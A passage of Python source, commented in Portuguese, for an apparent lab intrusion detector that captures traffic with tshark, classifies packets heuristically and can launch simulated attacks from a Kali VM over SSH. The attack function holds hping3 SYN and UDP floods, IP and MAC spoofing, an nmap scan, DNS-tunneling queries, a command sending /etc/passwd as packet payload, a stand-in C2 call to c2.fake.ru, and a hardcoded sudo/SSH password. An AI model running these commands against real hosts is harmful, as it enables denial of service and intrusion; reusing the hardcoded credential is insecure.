#     if pkt['src_port'] == 0 or pkt['dst_port'] == 0:
#         return "Pacote Malformado"
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#     if pkt['ttl'] > 200:
#         return "TTL Anômalo (Evasão)"
#
#     return "Tipo desconhecido"

# def classificar_tipo_ataque(pkt):
#     # Ignorar DHCP
#     if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
#         return "Tráfego DHCP (normal)"
#
#     # Ignorar consultas DNS normais
#     if pkt['dst_port'] == 53 or pkt['src_port'] == 53:
#         if pkt['ip_len'] < 600:
#             return "Consulta DNS (normal)"
#         else:
#             return "Resposta DNS grande (potencial tunneling ou consulta normal)"
#
#     # Ignorar tráfego NTP
#     if pkt['dst_port'] == 123 or pkt['src_port'] == 123:
#         return "Tráfego NTP (normal)"
#
#     # 🛡️ Verificar Evasão por TTL
#     if pkt['ttl'] == 1 or pkt['ttl'] <= 5:
#         return "Evasão por TTL Alterado"
#
#     # 🛡️ HTTP normal
#     if pkt['dst_port'] == 80 or pkt['src_port'] == 80:
#         if pkt['ip_len'] < 500:
#             return "Tráfego HTTP (normal)"
#
#     # Detectar IP Spoofing Externo
#     if (not ip_privado(pkt['src_ip'])) and ip_privado(pkt['dst_ip']):
#         return "IP Spoofing Externo"
#
#     # Detectar IP Spoofing Interno
#     if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
#         if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
#             return "IP Spoofing Interno"
#
#     # 🆕 Detectar TCP SYN Scan (Stealth Scan)
#     if 'tcp_flags' in pkt:
#         if pkt['tcp_flags'] == "S":  # Apenas SYN
#             return "Reconhecimento: TCP SYN Scan (Stealth)"
#
#     # Outros ataques
#     if pkt['dst_port'] == 53 and pkt['ip_len'] > 200:
#         return "DNS Tunneling"
#     if pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
#         return "TLS Handshake Incompleto"
#     if pkt['dst_port'] == 22:
#         return "Tentativa de Brute Force SSH"
#     if pkt['src_port'] == 0 or pkt['dst_port'] == 0:
#         return "Pacote Malformado"
#     if pkt['ip_len'] > 1500:
#         return "Flood UDP ou Amplificação"
#     if pkt['ttl'] > 200:
#         return "TTL Anômalo (Evasão)"
#
#     return "Tipo desconhecido"


def classificar_tipo_ataque(pkt):
    spoofing_detectado = None

    # Detectar IP Spoofing
    # if (not ip_privado(pkt['src_ip'])) and ip_privado(pkt['dst_ip']):
    #     spoofing_detectado = "IP Spoofing Externo"
    # elif ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
    #     if pkt['src_ip'] != "192.168.198.1" and not pkt['src_ip'].endswith(".131"):
    #         spoofing_detectado = "IP Spoofing Interno"
    if (not ip_privado(pkt['src_ip'])) and ip_privado(pkt['dst_ip']):
        return "IP Spoofing Externo"

    # Detectar IP Spoofing Interno apenas se for absurdo (exemplo: IP inválido, ou prefixo muito fora do normal)
    if ip_privado(pkt['src_ip']) and ip_privado(pkt['dst_ip']):
        if (pkt['src_ip'].split(".")[2] != pkt['dst_ip'].split(".")[2]) and (pkt['ttl'] > 50):
            return "IP Spoofing Interno"

    # Agora, continuar a classificação normal (sem bloquear)
    if pkt['dst_port'] in [67, 68] or pkt['src_port'] in [67, 68]:
        tipo = "Tráfego DHCP (normal)"
    elif pkt['dst_port'] == 53 or pkt['src_port'] == 53:
        if pkt['ip_len'] < 600:
            tipo = "Consulta DNS (normal)"
        else:
            tipo = "Resposta DNS grande (potencial tunneling ou consulta normal)"
    elif pkt['dst_port'] == 123 or pkt['src_port'] == 123:
        tipo = "Tráfego NTP (normal)"
    elif pkt['ttl'] == 1 or pkt['ttl'] <= 5:
        tipo = "Evasão por TTL Alterado"
    elif pkt['dst_port'] == 80 or pkt['src_port'] == 80:
        if pkt['ip_len'] < 500:
            tipo = "Tráfego HTTP (normal)"
        else:
            tipo = "Tráfego HTTP anômalo"
    elif 'tcp_flags' in pkt and pkt['tcp_flags']:
        if pkt['tcp_flags'] == "S":
            tipo = "Reconhecimento: TCP SYN Scan (Stealth)"
        else:
            tipo = "Tipo desconhecido"
    elif pkt['dst_port'] == 53 and pkt['ip_len'] > 200:
        tipo = "DNS Tunneling"
    elif pkt['dst_port'] == 443 and pkt['ip_len'] < 80:
        tipo = "TLS Handshake Incompleto"
    elif pkt['dst_port'] == 22:
        tipo = "Tentativa de Brute Force SSH"
    elif pkt['src_port'] == 0 or pkt['dst_port'] == 0:
        tipo = "Pacote Malformado"
    elif pkt['ip_len'] > 1500:
        tipo = "Flood UDP ou Amplificação"
    elif pkt['ttl'] > 200:
        tipo = "TTL Anômalo (Evasão)"
    else:
        tipo = "Tipo desconhecido"

    # Se também detectou spoofing, concatenar
    if spoofing_detectado:
        return f"{spoofing_detectado} + {tipo}"
    else:
        return tipo




def capturar_pacotes(interface_id, duracao, nome_arquivo):
    print(f"\n[+] Capturando pacotes na interface {interface_id} por {duracao} segundos...")
    subprocess.run([
        r"C:\\Program Files\\Wireshark\\tshark.exe", "-i", interface_id,
        "-a", f"duration:{duracao}", "-w", nome_arquivo, "-F", "pcap"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# def analisar_pcap(nome_arquivo):
#     try:
#         pkts = rdpcap(nome_arquivo)
#     except Exception as e:
#         print(f"❌ Erro ao abrir arquivo pcap: {e}")
#         exit()
#
#     linhas = []
#     for pkt in pkts:
#         if pkt.haslayer(IP):
#             dst_ip = pkt[IP].dst
#             dst_port = pkt[TCP].dport if pkt.haslayer(TCP) else (pkt[UDP].dport if pkt.haslayer(UDP) else None)
#             if dst_ip.startswith("224.") or dst_port in [53, 137, 123, 5353]:
#                 continue
#             linhas.append({
#                 'src_ip': pkt[IP].src,
#                 'dst_ip': pkt[IP].dst,
#                 'src_port': pkt[TCP].sport if pkt.haslayer(TCP) else (pkt[UDP].sport if pkt.haslayer(UDP) else None),
#                 'dst_port': pkt[TCP].dport if pkt.haslayer(TCP) else (pkt[UDP].dport if pkt.haslayer(UDP) else None),
#                 'ip_len': pkt[IP].len,
#                 'ttl': pkt[IP].ttl
#             })
#     return pd.DataFrame(linhas)


def analisar_pcap(nome_arquivo):
    try:
        pkts = rdpcap(nome_arquivo)
    except Exception as e:
        print(f"❌ Erro ao abrir arquivo pcap: {e}")
        exit()

    linhas = []
    for pkt in pkts:
        if pkt.haslayer(IP):
            dst_ip = pkt[IP].dst
            dst_port = pkt[TCP].dport if pkt.haslayer(TCP) else (pkt[UDP].dport if pkt.haslayer(UDP) else None)
            if dst_ip.startswith("224.") or dst_port in [53, 137, 123, 5353]:
                continue

            # CAPTURAR tcp_flags se for TCP
            flags = None
            if pkt.haslayer(TCP):
                flags = pkt[TCP].sprintf("%flags%")

            linhas.append({
                'src_ip': pkt[IP].src,
                'dst_ip': pkt[IP].dst,
                'src_port': pkt[TCP].sport if pkt.haslayer(TCP) else (pkt[UDP].sport if pkt.haslayer(UDP) else None),
                'dst_port': pkt[TCP].dport if pkt.haslayer(TCP) else (pkt[UDP].dport if pkt.haslayer(UDP) else None),
                'ip_len': pkt[IP].len,
                'ttl': pkt[IP].ttl,
                'tcp_flags': flags  # <-- adicionando flags aqui
            })
    return pd.DataFrame(linhas)

# def analisar_anomalias(df):
#     if df.empty:
#         print("✅ Nenhum tráfego relevante capturado.")
#         return
#     print("\n⚠️ Anomalias detectadas:")
#     print(df)
#     print("\n🕵️‍♂️ Classificação dos ataques:")
#     for _, linha in df.iterrows():
#         tipo = classificar_tipo_ataque(linha)
#         print(f"{linha['src_ip']} → {linha['dst_ip']} - {tipo}")



# def analisar_anomalias(df):
#     if df.empty:
#         print("✅ Nenhum tráfego relevante capturado.")
#         return
#
#     print("\n⚠️ Anomalias detectadas:")
#     print(df)
#
#     print("\n🕵️‍♂️ Classificação dos ataques:")
#
#     ips_spoofados = set()  # NOVO: para guardar IPs spoofados detectados
#
#     # Primeiro passo: detectar os pacotes anômalos e armazenar IPs spoofados
#     for _, linha in df.iterrows():
#         tipo = classificar_tipo_ataque(linha)
#
#         if tipo in ["IP Spoofing Interno", "IP Spoofing Externo"]:
#             ips_spoofados.add(linha['src_ip'])
#
#         print(f"{linha['src_ip']} → {linha['dst_ip']} - {tipo}")
#
#     # Segundo passo: analisar respostas para IPs spoofados
#     for _, linha in df.iterrows():
#         if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados:
#             print(f"{linha['src_ip']} → {linha['dst_ip']} - Resposta a IP Spoofado")

# def analisar_anomalias(df):
#     if df.empty:
#         print("✅ Nenhum tráfego relevante capturado.")
#         return
#
#     print("\n⚠️ Anomalias detectadas:")
#     print(df)
#
#     print("\n🕵️‍♂️ Classificação dos ataques:")
#
#     ips_spoofados = set()  # Guardar IPs spoofados detectados
#     logs = []  # NOVO: lista para armazenar os logs de eventos
#     respostas_indesejadas = 0  # NOVO: contador de respostas
#
#     # Primeiro passo: detectar pacotes anômalos
#     for _, linha in df.iterrows():
#         tipo = classificar_tipo_ataque(linha)
#
#         if tipo in ["IP Spoofing Interno", "IP Spoofing Externo"]:
#             ips_spoofados.add(linha['src_ip'])
#             logs.append(f"[ATAQUE] IP Spoofing detectado: {linha['src_ip']} → {linha['dst_ip']}")
#
#         print(f"{linha['src_ip']} → {linha['dst_ip']} - {tipo}")
#
#     # Segundo passo: analisar respostas para IP spoofado
#     for _, linha in df.iterrows():
#         if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados:
#             # print(f"{linha['src_ip']} → {linha['dst_ip']} - Resposta a IP Spoofado")
#             respostas_indesejadas += 1
#             logs.append(
#                 f"[ALERTA] Resposta indevida enviada pela vítima {linha['src_ip']} para IP spoofado {linha['dst_ip']}")
#
#     # Gerar o relatório final
#     print("\n📄 Relatório Final:")
#     for log in logs:
#         print(log)
#
#     if respostas_indesejadas > 0:
#         print(f"\n⚠️ Total de respostas indevidas a IPs spoofados: {respostas_indesejadas}")
#     else:
#         print("\n✅ Nenhuma resposta indevida detectada.")
#
#     print("\n✅ Análise concluída.")


# def analisar_anomalias(df):
#     if df.empty:
#         print("✅ Nenhum tráfego relevante capturado.")
#         return
#
#     print("\n⚠️ Anomalias detectadas:")
#     print(df)
#
#     print("\n🕵️‍♂️ Classificação dos ataques:")
#
#     ips_spoofados = set()
#     logs = []
#     respostas_indesejadas = 0
#
#     for _, linha in df.iterrows():
#         tipo = classificar_tipo_ataque(linha)
#
#         # 👉 Não queremos mais printar cada fluxo
#         # print(f"{linha['src_ip']} → {linha['dst_ip']} - {tipo}")
#
#         if tipo in ["IP Spoofing Interno", "IP Spoofing Externo"]:
#             ips_spoofados.add(linha['src_ip'])
#             logs.append(f"[ATAQUE] IP Spoofing detectado: {linha['src_ip']} → {linha['dst_ip']}")
#
#         if tipo == "Reconhecimento: TCP SYN Scan (Stealth)":
#             logs.append(f"[ATAQUE] TCP SYN Scan detectado: {linha['src_ip']} → {linha['dst_ip']}")
#
#     # for _, linha in df.iterrows():
#     #     if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados:
#     #         respostas_indesejadas += 1
#     #         logs.append(
#     #             f"[ALERTA] Resposta indevida enviada pela vítima {linha['src_ip']} para IP spoofado {linha['dst_ip']}"
#     #         )
#     for _, linha in df.iterrows():
#         if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados:
#             respostas_indesejadas += 1
#             # Não adiciona milhares de linhas no logs
#
#     # print("\n📄 Relatório Final:")
#     # for log in logs:
#     #     print(log)
#     print("\n📄 Relatório Final:")
#
#     # Imprime só os ataques detectados
#     for log in logs:
#         print(log)
#
#     # Depois separadamente mostra só o resumo das respostas indevidas
#     if respostas_indesejadas > 0:
#         print(f"\n⚠️ Total de respostas indevidas a IPs spoofados: {respostas_indesejadas}")
#     else:
#         print("\n✅ Nenhuma resposta indevida detectada.")


# def analisar_anomalias(df):
#     if df.empty:
#         print("✅ Nenhum tráfego relevante capturado.")
#         return
#
#     print("\n⚠️ Anomalias detectadas:")
#
#     ips_spoofados = set()  # Guardar IPs spoofados detectados
#     logs = []  # Lista para armazenar os eventos
#     respostas_indesejadas = 0  # Contador de respostas
#     contador_ataques = {}  # NOVO: Contar quantidade de ataques por tipo
#
#     # Primeiro passo: detectar pacotes anômalos
#     for _, linha in df.iterrows():
#         tipo = classificar_tipo_ataque(linha)
#
#         # Atualiza contador de tipos de ataques
#         contador_ataques[tipo] = contador_ataques.get(tipo, 0) + 1
#
#         # Identificar IP spoofing para análise posterior
#         if tipo in ["IP Spoofing Interno", "IP Spoofing Externo"]:
#             ips_spoofados.add(linha['src_ip'])
#             logs.append(f"[ATAQUE] IP Spoofing detectado: {linha['src_ip']} → {linha['dst_ip']}")
#
#     # Segundo passo: analisar respostas para IP spoofado
#     for _, linha in df.iterrows():
#         if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados:
#             respostas_indesejadas += 1
#             logs.append(f"[ALERTA] Resposta indevida enviada pela vítima {linha['src_ip']} para IP spoofado {linha['dst_ip']}")
#
#     # Gerar o relatório final
#     print("\n📄 Relatório Final:")
#
#     # Mostrar resumo dos ataques detectados
#     if contador_ataques:
#         print("\nResumo dos tipos de ataque detectados:")
#         for tipo, quantidade in contador_ataques.items():
#             print(f"- {tipo}: {quantidade} ocorrência(s)")
#     else:
#         print("✅ Nenhum ataque detectado.")
#
#     # Mostrar alerta de respostas indevidas
#     if respostas_indesejadas > 0:
#         print(f"\n⚠️ Total de respostas indevidas a IPs spoofados: {respostas_indesejadas}")
#     else:
#         print("\n✅ Nenhuma resposta indevida detectada.")
#
#     print("\n✅ Análise concluída.")



def analisar_anomalias(df):
    if df.empty:
        print("✅ Nenhum tráfego relevante capturado.")
        return

    print("\n⚠️ Anomalias detectadas:")

    ips_spoofados = set()
    logs = []
    respostas_indesejadas = 0
    contador_ataques = {}
    exemplos_ataques = {}  # NOVO: guardar amostras para cada tipo de ataque

    # Primeiro passo: detectar pacotes anômalos
    for _, linha in df.iterrows():
        tipo = classificar_tipo_ataque(linha)

        # Atualiza contador de tipos de ataques
        contador_ataques[tipo] = contador_ataques.get(tipo, 0) + 1

        # Guardar alguns exemplos de pacotes por tipo
        if tipo not in exemplos_ataques:
            exemplos_ataques[tipo] = []
        if len(exemplos_ataques[tipo]) < 5:  # limite de 5 exemplos por tipo
            exemplos_ataques[tipo].append(f"{linha['src_ip']} → {linha['dst_ip']} (Portas {linha['src_port']} → {linha['dst_port']})")

        # Identificar IP spoofing para análise posterior
        if tipo in ["IP Spoofing Interno", "IP Spoofing Externo"]:
            ips_spoofados.add(linha['src_ip'])

    # Segundo passo: analisar respostas para IP spoofado
    for _, linha in df.iterrows():
        if linha['dst_ip'] in ips_spoofados and linha['src_ip'] not in ips_spoofados:
            respostas_indesejadas += 1

    # Gerar o relatório final
    print("\n📄 Relatório Final:")

    if contador_ataques:
        print("\nResumo dos tipos de ataque detectados:")
        for tipo, quantidade in contador_ataques.items():
            print(f"- {tipo}: {quantidade} ocorrência(s)")

            # Exibir exemplos de cada tipo
            if exemplos_ataques.get(tipo):
                print(f"  Exemplos ({len(exemplos_ataques[tipo])}):")
                for exemplo in exemplos_ataques[tipo]:
                    print(f"    {exemplo}")

    else:
        print("✅ Nenhum ataque detectado.")

    # Mostrar alerta de respostas indevidas
    if respostas_indesejadas > 0:
        print(f"\n⚠️ Total de respostas indevidas a IPs spoofados: {respostas_indesejadas}")
    else:
        print("\n✅ Nenhuma resposta indevida detectada.")

    print("\n✅ Análise concluída.")



def executar_ataque(ip_kali, ip_vitima, opcao, ip_spoofado=None, mac_fake=None):
    comandos = {
        "1": f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10",
        "2": f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood",
        "3": f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}",
        "4": (
            f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
            f"sudo ip link set eth0 address {mac_fake} && "
            f"sudo ip link set eth0 up && ping -c 5 {ip_vitima} && "
            f"sudo ip link set eth0 down && sudo ip link set eth0 address 00:0c:29:f7:61:06 && sudo ip link set eth0 up"
        ),
        "5": f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 -E /etc/passwd -p 80 -f {ip_vitima}",
        "6": f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}",
        "7": f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}",
        "8": f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && curl -I http://{ip_vitima} && sudo tc qdisc del dev eth0 root",
        "9": f"for i in {{1..10}}; do dig TXT $(openssl rand -hex 15).malicio.so @{ip_vitima}; done",
        "10": f"dig any comandos.controle.tk && curl http://c2.fake.ru",
        "11": f"curl -A \"FakeScannerBot/9.9 (linux; rootkit)\" http://{ip_vitima}",
        "12": f"timeout 1 openssl s_client -connect {ip_vitima}:443"
    }
    print("🔐 Conectando na VM Kali...")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
    comando = comandos.get(opcao)
    if comando:
        print(f"🚀 Executando ataque: {comando}")
        stdin, stdout, stderr = ssh.exec_command(comando)
        print(stdout.read().decode())
        print(stderr.read().decode())
    else:
        print("❌ Opção inválida.")
    ssh.close()

# Programa principal
print("\U0001F9E0 Modo de Operação:\n")
print("1️⃣ Verificar a rede (modo monitoramento)")
print("2️⃣ Simular ataque (modo ofensivo)")
modo = input("\nEscolha o modo (1-2): ").strip()

if modo == "1":
    interface_id = "4"
    duracao = input("Digite o tempo de captura (em segundos): ").strip() or "60"
    # duracao = int(input("Digite o tempo de captura (em segundos): ").strip() or "60")
    nome_arquivo = "captura_ataque.pcap"
    capturar_pacotes(interface_id, duracao, nome_arquivo)
    df = analisar_pcap(nome_arquivo)
    analisar_anomalias(df)
    print("\n✅ Monitoramento finalizado.")

elif modo == "2":
    print("\n🔐 Simulador de Ataques:")
    print("1️⃣ IP Spoofing\n2️⃣ TCP SYN Flood\n3️⃣ UDP Flood\n4️⃣ MAC Spoofing\n5️⃣ Fragmentação Suspeita")
    print("6️⃣ TTL Alterado\n7️⃣ TCP SYN Scan\n8️⃣ Retransmissões Excessivas\n9️⃣ DNS Tunneling")
    print("🔟 Domínios Suspeitos\n1️⃣1️⃣ User-Agent Anormal\n1️⃣2️⃣ TLS Handshake Incompleto")

    opcao = input("\nSelecione o tipo de ataque (1-12): ").strip()
    ip_kali = input("🖥️ IP da máquina Kali: ").strip()
    ip_vitima = input("🎯 IP da máquina vítima: ").strip()
    ip_spoofado = mac_fake = None

    if opcao == "1":
        ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
    elif opcao == "4":
        mac_fake = input("🧬 MAC a ser falsificado: ").strip()

    interface_id = "4"
    nome_arquivo = "captura_ataque.pcap"
    capturar_pacotes(interface_id, 30, nome_arquivo)
    executar_ataque(ip_kali, ip_vitima, opcao, ip_spoofado, mac_fake)
    df = analisar_pcap(nome_arquivo)
    analisar_anomalias(df)
    print("\n✅ Simulação finalizada.")

else:
    print("\u274c Modo inválido. Encerrando.")
#






